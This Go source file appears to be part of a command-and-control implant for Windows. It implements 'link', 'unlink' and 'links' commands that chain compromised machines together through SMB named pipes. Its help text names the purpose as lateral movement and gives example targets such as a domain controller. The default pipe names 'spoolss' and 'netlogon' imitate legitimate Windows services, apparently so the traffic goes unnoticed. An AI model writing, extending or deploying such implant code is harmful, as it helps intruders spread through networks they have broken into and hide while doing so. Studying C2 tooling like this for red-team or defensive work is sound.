//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
	"strings"
	"time"
)

// LinkCommand handles the 'link' command for connecting to other SMB agents
type LinkCommand struct{}

func (c *LinkCommand) Name() string {
	return "link"
}

func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 2 {
		return CommandResult{
			Output: `Usage: link <protocol> <target_host> [pipe_name]

Connect to a link agent for lateral movement.

Protocols:
  smb    Connect via SMB named pipe

Arguments:
  protocol       Connection protocol (smb)
  target_host    Hostname or IP address of the target machine
  pipe_name      Named pipe name (default: spoolss)

Examples:
  link smb 192.168.1.50 spoolss
  link smb dc01.corp.local netlogon
  link smb localhost customPipe
  link smb 10.0.0.5                 (uses default pipe: spoolss)

Note: The link agent must be running and listening on the target.`,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case "smb":
		pipeName := "spoolss" // default pipe name
		if len(args) >= 3 {
			pipeName = args[2]
		}

		// Build the full UNC pipe path
		// Handle localhost specially - use "." for local machine
		if strings.ToLower(targetHost) == "localhost" || targetHost == "127.0.0.1" {
			targetHost = "."
		}

		pipePath := fmt.Sprintf(`\\%s\pipe\%s`, targetHost, pipeName)
		return c.linkSMB(pipePath)

	default:
		return CommandResult{
			Output:      fmt.Sprintf("Error: Unknown protocol '%s'. Supported protocols: smb", protocol),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link
	routingID, err := lm.Link(pipePath)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Error: Failed to link to %s: %v", pipePath, err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	// This avoids waiting for the next poll cycle
	handshakeResult := performImmediateHandshake(lm, routingID)

	return CommandResult{
		Output: fmt.Sprintf(`Successfully linked to SMB agent
  Pipe: %s
  Routing ID: %s
  Handshake: %s

Use 'links' to see active connections.
Use 'unlink %s' to disconnect.`, pipePath, routingID, handshakeResult, routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
// instead of waiting for the next poll cycle
func performImmediateHandshake(lm *LinkManager, routingID string) string {
	log.Printf("[SMB LinkCommand] Starting immediate handshake for routing_id %s", routingID)

	// Wait briefly for the SMB agent's handshake to arrive in the outbound queue
	// The handleIncomingData goroutine should receive it shortly after connection
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *LinkDataOut
	for time.Now().Before(deadline) {
		// Check outbound queue for handshake data
		data := lm.GetOutboundData()
		for _, item := range data {
			if item.RoutingID == routingID {
				handshakeData = item
				break
			}
		}
		if handshakeData != nil {
			break
		}
		// Re-queue any data that wasn't for us
		for _, item := range data {
			if item.RoutingID != routingID {
				lm.queueOutboundData(item)
			}
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		log.Printf("[SMB LinkCommand] No handshake received from SMB agent within timeout")
		return "pending (will complete on next callback)"
	}

	log.Printf("[SMB LinkCommand] Got handshake from SMB agent, queuing for parent")

	// Queue the handshake data to be sent on the next response to parent.
	// The handshake will be sent when the parent polls us for data.
	lm.queueOutboundData(handshakeData)

	log.Printf("[SMB LinkCommand] Handshake queued for routing_id %s, will be sent to parent", routingID)
	return "queued (will complete on next callback)"
}

// UnlinkCommand handles the 'unlink' command for disconnecting from SMB agents
type UnlinkCommand struct{}

func (c *UnlinkCommand) Name() string {
	return "unlink"
}

func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: `Usage: unlink <routing_id>

Disconnects from a linked SMB agent.

Use 'links' to see active connections and their routing IDs.`,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := GetLinkManager()

	if err := lm.Unlink(routingID); err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Error: Failed to unlink %s: %v", routingID, err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      fmt.Sprintf("Successfully unlinked from routing ID: %s", routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// LinksCommand handles the 'links' command for listing active SMB links
type LinksCommand struct{}

func (c *LinksCommand) Name() string {
	return "links"
}

func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	lm := GetLinkManager()
	output := lm.ListLinks()

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
